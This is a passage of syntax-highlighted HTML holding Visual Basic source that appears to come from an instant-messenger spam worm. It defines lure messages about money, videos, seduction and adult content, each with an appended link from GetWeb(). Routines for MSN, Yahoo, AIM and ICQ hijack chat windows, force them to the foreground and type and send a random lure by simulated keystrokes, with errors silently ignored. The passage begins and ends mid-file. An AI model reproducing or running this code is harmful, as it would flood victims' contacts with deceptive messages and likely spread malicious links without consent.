</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">17</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"It makes money in internet "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">18</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"looks at this illusion optic "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">19</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"It discharges this video, this good "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">20</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"This Cartoon looks "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">21</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"listens this mp3 "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">22</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"knows the secrets of ocultismo "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">23</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New Manual Section of Seduction "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">24</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Do you know like thinks the opposite sex? "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Alone it stops bigger than 18 years "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">26</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Radio On-line "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">27</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Invitation to receive sign of camera web "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">28</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Song of the Mammoth third part "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc2">29</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"It participates in the I draw and it wins a super computer "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">GetWeb</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SpamMsn</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">mHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ShowWindow</span><span class="sc6">(</span><span class="sc7">mHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">mHwnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">mHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">mHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">mHwnd</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindWindowEx</span><span class="sc6">(</span><span class="sc7">mHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DirectUIHWND"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CHAR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYDOWN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYUP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">

</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SpamYms</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">yHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">ShowWindow</span><span class="sc6">(</span><span class="sc7">yHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">yHwnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">yHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">yHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">yHwnd</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindWindowEx</span><span class="sc6">(</span><span class="sc7">yHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"RICHEDIT20a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindWindowEx</span><span class="sc6">(</span><span class="sc7">yHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"RICHEDIT"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CHAR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYDOWN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">l</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYUP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">

</span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumChildProc</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">chWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">

</span><span class="sc7">DoEvents</span><span class="sc0">

</span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space$</span><span class="sc6">(</span><span class="sc2">256</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetClassName</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">chWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wnc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">wnc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">LCase</span><span class="sc6">(</span><span class="sc7">wnc</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"ate32class"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SpamAim</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">chWnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">EnumChildProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SpamAim</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">aHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

    </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">))</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">aHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_CHAR</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Asc</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">spam</span><span class="sc6">(</span><span class="sc7">sr</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">aHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYDOWN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">PostMessage</span><span class="sc6">(</span><span class="sc7">aHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">WM_KEYUP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">&amp;)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">SpamIcq</span><span class="sc6">(</span><span class="sc7">iHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">iHwnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">

</span><span class="sc7">Whd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">aw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Whs</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc6">(</span><span class="sc7">iHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc6">(</span><span class="sc7">Whs</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Whd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">iHwnd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0"> </span><span class="sc3">Until</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">iHwnd</span><span class="sc0">

</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">Randomize</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FindWindowEx</span><span class="sc6">(</span><span class="sc7">iHwnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"RICHEDIT20a"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbNullString</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">l</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

